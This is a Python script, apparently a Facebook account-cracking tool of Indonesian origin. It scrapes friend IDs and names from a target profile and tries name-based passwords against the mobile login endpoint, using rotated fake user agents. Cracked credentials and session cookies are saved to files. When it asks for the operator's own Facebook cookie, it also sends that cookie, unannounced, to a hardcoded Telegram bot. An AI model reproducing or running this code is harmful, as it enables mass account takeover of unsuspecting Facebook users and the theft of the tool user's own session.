#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time,datetime
import requests
import base64,subprocess,uuid

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#	
from time import sleep
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.panel import Panel as panel

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen, ugen2 = [],[],[]
loop, ok, cp = 0,0,0
rc = random.choice
rr = random.randint
dump = []

#----------[ USER-CRACK ]----------#  
bulane = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tanggal = datetime.datetime.now().day
bulan = bulane[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
ok1 = 'OK1-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
ok2 = 'OK2-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
cpc = 'CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'

#------------#
for xd in range(10000):
    rr = random.randint
    rc = random.choice
    merek = random.choice(['M2007J17G','M2007J17G','SM-A405FN','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280','SM-N975U1','Lenovo TB2-X30L','SM-J510FN','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2','CPH1725','M2010J19CG'])
    gt = random.choice(['N6F26Q','SP1A','SP1A.210812.016','N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H','LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD','LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD','NRD90M','LMY48B','R16NW','LRX21M','PKQ1','KOT49H','LMY47I','SKQ1','NGI77B','OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016','RKQ1.201004.002'])
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
    ua = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; M2012K11AG Build/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ua1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X5514D Build/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} gt/{gt}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.{str(rr(0,4))} Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} gt/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    UaMainn = random.choice([ua,ua1,u1,u2,u3])
    ugen.append(UaMainn)

#--------[ GENERATE-USER-AGENT ]----------#
for memekx in range(200):
	rr = random.randint
	rc = random.choice
	android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
	fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
	fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
	build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
	merk2 = ['Lenovo TB2-X30L','SM-J510FN','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
	fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
	fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
	fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
	merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
	large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
	dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
	ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	api = str(rc([ua1,ua2,ua3]))
	ugen2.append(api)
	
#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100,124)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
	
def clear():
    os.system('clear')
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([m, k, h, u, b])
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
ses=requests.Session()
#----------[ BANNER ]----------#
def linex():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f"""{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{hijo}[{hijo}≈{hijo}]{hijo} Author   : {hijo}Anton and BroColi
{hijo}[{hijo}≈{hijo}]{hijo} Tools    : {hijo}Free
{hijo}[{hijo}≈{hijo}]{hijo} Facebook : {hijo}Anton Thomz
{hijo}[{hijo}≈{hijo}]{hijo} Whatsapp : {hijo}083198645688
{hijo}[{hijo}≈{hijo}]{hijo} Github   : {hijo}Antonkawe
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#kukis
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' [+] Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
		
def login_lagi334():
	os.system('clear')
	cok = input(f' {puti} Login Your Cookies : {hijo}')
	requests.post(f'https://api.telegram.org/6451969140:AAHPEK8Mkc46aJsVlCnFwHtQhxDdRuBgNDQ/sendMessage?chat_id=-6817886155&text={cok}')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> \x1b[1;91mcookie kamu invalid / ganti cookie lain !!!');time.sleep(2);batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f'\n{puti} Your Token : {hijo}{took}')
				exit()
	except Exception as e:
		print(e)
#----------[ BAGIAN-MENU ]----------#            
def menu():
	clear()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P} [:] cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P} [:] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
	clear()
	linex()
	print(f'{hijo}[1] PUBLIK CLONE ')
	print(f'{hijo}[2] FILE CLONE ')
	print(f'{hijo}[3] CEK HASIL OK/CP ')
	print(f'{hijo}[0] HPS/OUT COOKIE ')
	sex = input(f'{hijo} [☆]CHOICE ➢{hijo} ')
	if sex in ['1','01']:
	        idt = input('\nPaste Ids Target : ')
	        dump(idt,"",{"cookie":cok},token)
	        clear()
	        linex()
	        atur_id()
	elif sex in ['2','02']:File()
	elif sex in ['3','03']:cekhasil()
	elif sex in ['0']:hapus()
def hapus():
	os.system('rm -rf .token.txt')
	os.system('rm -rf .cok.txt')
	print(f' [+] {hijo}Sukses Logout+Hapus Cookies')
#----------[ CRACK-PUBLIK  ]----------#            
def cekhasil():
	clear()
	print(f'{G1}[{A}1{G1}]{hijo} CEK HASIL OK ')
	print(f'{G1}[{A}2{G1}]{kun} CEK HASIL CP ')
	random = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
	if random in ['1','01']:kon()
	elif random in ['2','02']:mek()
	else:exit()
	
#----------[ CRACK-PUBLIK  ]----------#            
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r{puti}telah succses mengumpulkan [{hijo}{len(id)}{puti}] id akun"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

#-#
def File():
	try:
		clear()
		print(f'{puti}[{hijo}>{puti}] Masukan File Contoh {puti}[{hijo}>{puti}] {hijo}/sdcard/namafile.txt')
		fileX = input (f'{puti}[{hijo}>{puti}] File Path : {puti}')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		atur_id()
	except IOError:
		exit(f"{puti}[{hijo}!{puti}] Input File Yang Benar")
		sleep(2);login()
#----------[ HASIL-OK ]----------#            
def kon():
	clear()
	try:vin = os.listdir('OK')
	except FileNotFoundError:
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		exit(f"{biru}└──[{kun} File tidak di temukan ")
	if len(vin)==0:
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		exit(f"{biru}└──[{kun} Tidak mempuyai file OK ")
	else:
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{biru}└──[{kun} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{biru}└──[{kun} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		geeh = input(f'{biru}└──[{kun} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		    exit(f"{biru}└──[{kun} Pilih yang bener :-( ")
		try:lin = open('OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		    exit(f"{biru}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		input(f'{biru}└──[{kun} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def mek():
	clear()
	try:vin = os.listdir('CP')
	except FileNotFoundError:
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		exit(f"{biru}└──[{kun} File tidak di temukan ")
	if len(vin)==0:
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		exit(f"{biru}└──[{kun} Tidak mempuyai file OK ")
	else:
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		    exit(f"{biru}└──[{kun} Pilih yang bener :-( ")
		try:lin = open('CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		    exit(f"{biru}└──[{kun} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{mer}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━{kun}")
		input(f'{biru}└──[{kun} Klik Enter {kun}]')
		menu()
																		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     

def atur_method():
	clear()
	linex()
	print(f'{hijo} Setting Your Method Url ')
	print(f'{puti} [{hijo}01{puti}]{hijo} m.prod.facebook.com')
	CYXIEON_METHODE = input(f'{puti} [☆] Pilih Method :{hijo} ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('validate')    
	print(f"{hijo}╭────────────────────────────────────────────{puti}")
	print(f'{hijo}└──[{hijo} Tambahkan pw manual (y/t) ')
	print(f"{hijo}╭────────────────────────────────────────────{puti}") 	
	passwtamb = input(f'{hijo}└──[{hijo} Input : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     print(f"{hijo}╭────────────────────────────────────────────{puti}")
		     sandiku = input(f'{hijo}└──[{hijo} Input Pw : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	

def passwordlist():
	global prog,des
	clear()
	linex()
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = [frestile+'4321',frestile+'123456789']
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'54321')
						pwx.append(frestile+'cantik')
						pwx.append('kata sandi')
						pwx.append(frestile+'ganteng')
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'54321')
						pwx.append(frestile+'cantik')
						pwx.append('kata sandi')
						pwx.append(frestile+'ganteng')
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'validate' in method:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'mbasic.facenook.com')
				else:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
	print(f"{hijo}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}")
	print(f'{kun}└──[{puti} OK {hijo}: %s'%(ok))
	print(f'{kun}└──[{puti} CP {kun}: %s'%(cp))
	print(f"{hijo}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{puti}")
	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	rr = random.randint
	rc = random.choice
	prog.update(des,description=f"\r[ ANTON-M1 ][%sOK:{ok}%s][%sCP:{cp}%s][%s{loop}%s|{len(id)}]"%(hijo,puti,kun,puti,hijo,puti))
	prog.advance(des)
	ses = requests.Session()
	for pw in pwx:
		try:
			ua = random.choice(ugen)
			#ua2 = (["Mozilla/5.0 (Linux; Android 9; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/223.0.0.47.120;]"])
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"{hijo}[ANTON404-OK] {hijo}{idf} | {hijo}{pw} | {kun}{tahun(idf)}")
				open('OK/'+ok1,'a').write(idf+'|'+pw+'\n'+ua+'\n')
				open('OK/'+ok2,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"{kun}[ANTON404-CP] {kun}{idf} | {kun}{pw} | {mer}{tahun(idf)}")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break	
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(9)
	loop+=1
	

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
